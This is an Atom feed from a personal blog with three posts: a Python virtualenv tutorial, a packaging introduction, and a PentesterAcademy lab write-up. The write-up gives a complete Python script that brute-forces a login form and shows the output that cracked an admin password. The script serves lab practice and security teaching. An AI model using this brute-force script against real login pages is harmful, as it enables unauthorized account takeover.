<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: python | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/python/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2016-08-29T15:52:15-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Python virtualenv]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/29/python-virtualenv/"/>
    <updated>2016-07-29T17:55:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/29/python-virtualenv</id>
    <content type="html"><![CDATA[<p>In this post I am going to introduce Python&rsquo;s virtual environments, through the <strong>virtualenv</strong> tool. With this tool, you can keep separate environments for your projects, with their own dependencies and executables. By isolating the project environments, you can keep them neat and organized, without messing up your global installation. Depending on the requirements of what you&rsquo;re working on, you can use different versions of Python or keep older libraries on a per-project basis. Nothing outside the virtual environment will be modified.</p>

<!-- more -->


<h1>Installation</h1>

<p>To begin with, install <em>virtualenv</em>. You can do it in several ways. Via pip: <code>pip install virtualenv</code>, or with easy_install: <code>easy_install virtualenv</code>. Now let&rsquo;s look at the help menu:</p>

<p>``` plain
root@kali:~# virtualenv -h
Usage: virtualenv [OPTIONS] DEST_DIR</p>

<p>Options:
  &mdash;version             show program&rsquo;s version number and exit
  -h, &mdash;help            show this help message and exit
  -v, &mdash;verbose         Increase verbosity.
  -q, &mdash;quiet           Decrease verbosity.
  -p PYTHON_EXE, &mdash;python=PYTHON_EXE</p>

<pre><code>                    The Python interpreter to use, e.g.,
                    --python=python2.5 will use the python2.5 interpreter
                    to create the new environment.  The default is the
                    interpreter that virtualenv was installed with
                    (/usr/bin/python)
</code></pre>

<p>  &mdash;clear               Clear out the non-root install and start from scratch.
  &mdash;no-site-packages    DEPRECATED. Retained only for backward compatibility.</p>

<pre><code>                    Not having access to global site-packages is now the
                    default behavior.
</code></pre>

<p>  &mdash;system-site-packages</p>

<pre><code>                    Give the virtual environment access to the global
                    site-packages.
</code></pre>

<p>  &mdash;always-copy         Always copy files rather than symlinking.
  &mdash;unzip-setuptools    Unzip Setuptools when installing it.
  &mdash;relocatable         Make an EXISTING virtualenv environment relocatable.</p>

<pre><code>                    This fixes up scripts and makes all .pth files
                    relative.
</code></pre>

<p>  &mdash;no-setuptools       Do not install setuptools in the new virtualenv.
  &mdash;no-pip              Do not install pip in the new virtualenv.
  &mdash;no-wheel            Do not install wheel in the new virtualenv.
  &mdash;extra-search-dir=DIR</p>

<pre><code>                    Directory to look for setuptools/pip distributions in.
                    This option can be used multiple times.
</code></pre>

<p>  &mdash;download            Download preinstalled packages from PyPI.
  &mdash;no-download, &mdash;never-download</p>

<pre><code>                    Do not download preinstalled packages from PyPI.
</code></pre>

<p>  &mdash;prompt=PROMPT       Provides an alternative prompt prefix for this</p>

<pre><code>                    environment.
</code></pre>

<p>  &mdash;setuptools          DEPRECATED. Retained only for backward compatibility.</p>

<pre><code>                    This option has no effect.
</code></pre>

<p>  &mdash;distribute          DEPRECATED. Retained only for backward compatibility.</p>

<pre><code>                    This option has no effect.
</code></pre>

<p>```</p>

<h1>Usage</h1>

<p>So you&rsquo;re about to begin a new project. You want to start from scratch and keep it contained to itself. Creating a virtual environment will help you accomplish that:</p>

<p><code>virtualenv my_project</code></p>

<p>Now you can go to the newly created directory and see that there are already some folders inside. <code>bin</code> has the executables, <code>include</code> holds the header files, and <code>lib</code> contains the files of the installed modules in the virtual environment.</p>

<p>Before you begin to work with your new environment, you need to activate it with <code>source bin/activate</code> or <code>source env_name/bin/activate</code> if you are outside the environment&rsquo;s directory.</p>

<p>You will now see your propmt change, to confirm that the environment is active. For me, it looks like:</p>

<p><code>plain
(my_project) root@kali:~/projects/my_project#
</code></p>

<p>Now you can begin your work, installing packages, etc. When you&rsquo;re done, you can type <code>deactivate</code> to exit your environment. If you want to delete it, just remove its directory.</p>

<p>When working with virtual environments, it might be helpful to take a snapshot of your installed packages and their versions, in case you want to recreate the environment later. You can do this with <code>pip freeze > requirements.txt</code>. Check the newly created file for a list of your snapshotted items. In my case, I only installed requests in my environment so far:</p>

<p><code>plain
cat requirements.txt
requests==2.10.0
</code></p>

<p>If you need the exact same environment later, maybe to let some one of your team to work on the project, you can install the same packages and versions with the command <code>pip install -r requirements.txt</code></p>

<h2>virtualenvwrapper</h2>

<p>To make working with virtual environments even more convenient, you can use <em>virtualenvwrapper</em>, which provides wrappers for managing your environments and helps keep all your environments in one place. It also allows you to switch between environments with only one command, and has tab completion.</p>

<p>First, install it (outside your environments), with <code>pip install virtualenvwrapper</code>.</p>

<p>Then you need to add a few lines to your shell startup script. In my <code>~/.bashrc</code> file, I added the following:</p>

<p>``` plain</p>

<h1>set the location where your virtual environments will be stored</h1>

<p>export WORKON_HOME=$HOME/.virtualenvs</p>

<h1>set the location of the virtualenvwrapper script (where it was installed)</h1>

<p>source /usr/local/bin/virtualenvwrapper.sh
```</p>

<p>Now reload the startup file: <code>source ~/.bashrc</code> and you will see that your .virtualenvs folder has been created and populated with some scripts. Let&rsquo;s look at the help menu to see the available commands:</p>

<p>``` plain
virtualenvwrapper</p>

<p>virtualenvwrapper is a set of extensions to Ian Bicking&rsquo;s virtualenv
tool.  The extensions include wrappers for creating and deleting
virtual environments and otherwise managing your development workflow,
making it easier to work on more than one project at a time without
introducing conflicts in their dependencies.</p>

<p>For more information please refer to the documentation:</p>

<pre><code>http://virtualenvwrapper.readthedocs.org/en/latest/command_ref.html
</code></pre>

<p>Commands available:</p>

<p>  add2virtualenv: add directory to the import path</p>

<p>  allvirtualenv: run a command in all virtualenvs</p>

<p>  cdproject: change directory to the active project</p>

<p>  cdsitepackages: change to the site-packages directory</p>

<p>  cdvirtualenv: change to the $VIRTUAL_ENV directory</p>

<p>  cpvirtualenv: duplicate the named virtualenv to make a new one</p>

<p>  lssitepackages: list contents of the site-packages directory</p>

<p>  lsvirtualenv: list virtualenvs</p>

<p>  mkproject: create a new project directory and its associated virtualenv</p>

<p>  mktmpenv: create a temporary virtualenv</p>

<p>  mkvirtualenv: Create a new virtualenv in $WORKON_HOME</p>

<p>  rmvirtualenv: Remove a virtualenv</p>

<p>  setvirtualenvproject: associate a project directory with a virtualenv</p>

<p>  showvirtualenv: show details of a single virtualenv</p>

<p>  toggleglobalsitepackages: turn access to global site-packages on/off</p>

<p>  virtualenvwrapper: show this help message</p>

<p>  wipeenv: remove all packages installed in the current virtualenv</p>

<p>  workon: list or change working virtualenvs
```</p>

<p>Ok, let&rsquo;s create a new environment: <code>mkvirtualenv beta_proj</code>. You can list all your environments with <code>lsvirtualenv</code></p>

<p>``` plain
lsvirtualenv</p>

<h1>beta_proj</h1>

<p>```</p>

<p>Use the <code>workon</code> command to begin..working on your new environment: <code>workon beta_proj</code>. When finished, you can use <code>deactivate</code> again,or you can switch between multiple environments with <code>workon</code>.</p>

<p>Removing an environment can be done with the <code>rmvirtualenv</code> command</p>

<p>That&rsquo;s about all the basic tips needed to quick start your use of virtual environments in your Python projects. For more information, you can check the <a href="https://virtualenv.pypa.io/en/stable/">virtualenv</a> and <a href="https://virtualenvwrapper.readthedocs.io/en/latest/index.html">virtualenvwrapper</a> documentation.</p>

<p>``` plain</p>

<hr />

<p>/ Do what comes naturally. Seethe and \
\ fume and throw a tantrum.           /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PentesterAcademy WAP Challenge 1: Form Bruteforcing]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/26/pentesteracademy-wap-challenge-1-form-bruteforcing/"/>
    <updated>2014-07-26T17:31:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/26/pentesteracademy-wap-challenge-1-form-bruteforcing</id>
    <content type="html"><![CDATA[<p><a href="http://www.pentesteracademy.com">PentesterAcademy</a> has a section dedicated to web application security challenges. In this post I will present my solution to the first challenge, which requires form bruteforcing to authenticate on the provided web page:</p>

<p><a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a></p>

<!-- more -->


<p>This is how the page looks like:</p>

<p><img class="center" src="/images/wap1.png" title="&lsquo;wap1&rsquo; &lsquo;wap1&rsquo;" ></p>

<p>The provided hint should help with writing a bruteforce script:</p>

<p><strong>Hint:</strong></p>

<p><strong>Company Domain: PentesterAcademy.com</strong></p>

<p><strong>Usernames: jack, admin</strong></p>

<p><strong>Password Complexity: 5 characters and uses only x,y,z lowercase. Password examples &ndash; xxyyz, xyzxy, xyxxx etc.</strong></p>

<p>So, what we need here is to test the login with usernames of the form <em>user@companydomain</em> and 5 character passwords constructed from the given characters.</p>

<p>I wrote a Python script to do that:</p>

<p>``` python
import requests
import itertools</p>

<p>url = &lsquo;<a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a>&rsquo;</p>

<p>emails = [&lsquo;<a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#106;&#x61;&#99;&#x6b;&#64;&#x70;&#x65;&#110;&#x74;&#x65;&#x73;&#x74;&#x65;&#x72;&#97;&#x63;&#x61;&#100;&#x65;&#x6d;&#121;&#x2e;&#x63;&#x6f;&#x6d;">&#106;&#x61;&#99;&#107;&#64;&#x70;&#101;&#110;&#x74;&#x65;&#115;&#116;&#101;&#114;&#x61;&#x63;&#x61;&#x64;&#101;&#109;&#x79;&#x2e;&#99;&#x6f;&#109;</a>&rsquo;, \</p>

<pre><code>      'admin@pentesteracademy.com']
</code></pre>

<p>def buildPassList(iterables, r):</p>

<pre><code>passlist = []
for word in itertools.product(iterables, repeat = r):
    passlist.append(''.join(word))
return passlist
</code></pre>

<p>passlist = buildPassList(&lsquo;xyz&rsquo;, 5)</p>

<p>count = 0
fail = &lsquo;Failed! Please try again!&rsquo;
for user in emails:</p>

<pre><code>for passwd in passlist:
    print 'Try %d - email: %s password: %s' % (count, user, passwd)
    payload = {'email': user, 'password': passwd}
    req = requests.get(url, params=payload)
    if fail not in req.content:
        print payload
        print req.content
        break          
    count += 1
</code></pre>

<p>```</p>

<p>I used the requests module, which is very handy for all sorts of URL interaction. To figure out the parameter names and how are they passed to the login form, I tested with some garbage values and saw the URL looked like this:</p>

<p><code>plain
http://pentesteracademylab.appspot.com/lab/webapp/1?email=test&amp;password=xyz
</code></p>

<p>From that I knew to use the GET request in the code. Also, when you fail, you get a message stating that you should try again, so I looked for that in the response from the server, and I concluded that if it were absent, it means that the login was successful. When you complete the challenge, there is also a message that says &ldquo;Well done! This challenge has been cracked!&rdquo;</p>

<p>Here is a snippet of the output:</p>

<p><code>plain
Try 0 - email: jack@pentesteracademy.com password: xxxxx
Try 1 - email: jack@pentesteracademy.com password: xxxxy
...
Try 477 - email: admin@pentesteracademy.com password: zzzxx
Try 478 - email: admin@pentesteracademy.com password: zzzxy
{'password': 'zzzxy', 'email': 'admin@pentesteracademy.com'}
</code></p>

<p>Today&rsquo;s fortune cookie:</p>

<blockquote><p>While you recently had your problems on the run, they&rsquo;ve regrouped and
are making another attack.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Introduction to Python packaging]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/20/introduction-to-python-packaging/"/>
    <updated>2014-07-20T15:14:31-04:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/20/introduction-to-python-packaging</id>
    <content type="html"><![CDATA[<p>There is a lot of confusion and heated debate over the Python packaging system. In this post I want to cover the basics of it so it&rsquo;s easier to understand.</p>

<!-- more -->


<p>One of the strengths of the Python programming language is its rich standard library that contains many useful modules suited for various tasks. However, more often than not, you will need to enhance the already rich standard library with additional, third party packages that are not installed by default. So, how do you install new packages?</p>

<h4>What is a package?</h4>

<p>First of all, a package in Python is simply a directory that contains a file named <code><strong>init</strong>.py</code>. You can make your own packages by creating a directory with your desired name and creating an init file like the above inside it. Then you can import your package like you do with the rest.</p>

<h4>The manual way</h4>

<p>Of course, it&rsquo;s possible to manually install packages by unpacking their respective tarballs and dropping them in the directory where modules are installed. On Windows, this directory is called <strong>site-packages</strong> and it can be found in your Python install directory: <code>C:\Python27\Lib\site-packages</code>. On Linux, it&rsquo;s named <strong>dist-packages</strong> and you can find it in <code>/usr/lib/python2.7/dist-packages</code>. Remember to account for your actual installation directories and Python versions, these are the examples from my machines.</p>

<h4>Using a package manager</h4>

<p>A package manager is supposed to ease the process of installing and maintaining packages in a centralized way. This is the more convenient way of installing new Python packages. Here are some benefits of packaging as explained on <a href="http://guide.python-distribute.org/introduction.html">The Hitchhikerâ€™s Guide to Packaging</a>:</p>

<blockquote><ul>
<li>Dependency management</li>
</ul>


<p>Often, the package you want to install requires that others be there. A package management system can
automatically resolve dependencies and make your installation pain free and quick. This is one of the basic
facilities offered by distutils. However, other extensions to distutils do a better job of installing
dependencies.</p>

<ul>
<li>Accounting</li>
</ul>


<p>Package managers can maintain lists of things installed and other metadata like the version installed etc.
which makes is easy for the user to know what are the things his system has.</p>

<ul>
<li>Uninstall</li>
</ul>


<p>Package managers can give you push button ways of removing a package from your environment.</p>

<ul>
<li>Search</li>
</ul>


<p>Find packages by searching a package index for specific terminology</p></blockquote>

<p><strong>distutils</strong></p>

<p>The standard package manager that comes preinstalled with Python is distutils. The standard distribution follows a certain pattern, such as the archive name and unpacking directory having a name composed from the name and version of the distribution, like so: <code>name-version</code>. Here&rsquo;s an example: <code>foo-1.0</code>.</p>

<p>Also, the distribution should contain a setup script called <code>setup.py</code> and a README file with instructions on how to install it. The command <code>python setup.py install</code> is used for building and installation. If you want to break up this process, you can choose to build it yourself first, by running <code>python setup.py build</code>, This will put the files that are to be installed in a build directory. Afterwards, you can run the install command to copy these files in your install directory.</p>

<p><strong>setuptools</strong></p>

<p>setuptools is supposed to enhance the features of distutils. It brings to the table a module called <strong>easy_install</strong> that lets you automatically download, build, install, and manage Python packages.</p>

<p>To install setuptools, you have to run the <a href="https://bootstrap.pypa.io/ez_setup.py"><em>ez_setup.py</em></a> script. And to install a package with easy_install, you just do <code>easy_install package name</code>.</p>

<p><strong>pip</strong></p>

<p>pip is an alternative Python package installer. It performs the same basic job as easy_install, but with some extra features. It can work with version control repositories (currently only Git, Mercurial, andBazaar repositories), logs output extensively, and prevents partial installs by downloading all requirements before starting installation.</p>

<p>To install pip, download and run <a href="https://bootstrap.pypa.io/get-pip.py"><em>get-pip.py</em></a>. With pip you can easily manage your Python packages from the command line:</p>

<ul>
<li><p>install a package: <code>pip install package name</code></p></li>
<li><p>uninstall a package: <code>pip uninstall package name</code></p></li>
<li><p>upgrade a package to its latest version: <code>pip install -U package name</code> (alternatively, you can also use the &mdash;upgrade flag)</p></li>
<li><p>list installed packages: <code>pip list</code></p></li>
<li><p>show information about one or more installed packages <code>pip show package name</code></p></li>
</ul>


<p>Due to its features and convenience, pip is my favorite package installer. Of course, there are more advanced features in Python packaging, but I hope this introduction was helpful for getting to install and manage your packages.</p>

<blockquote><p>You will stop at nothing to reach your objective, but only because your brakes are defective.</p></blockquote>
]]></content>
  </entry>
  
</feed>
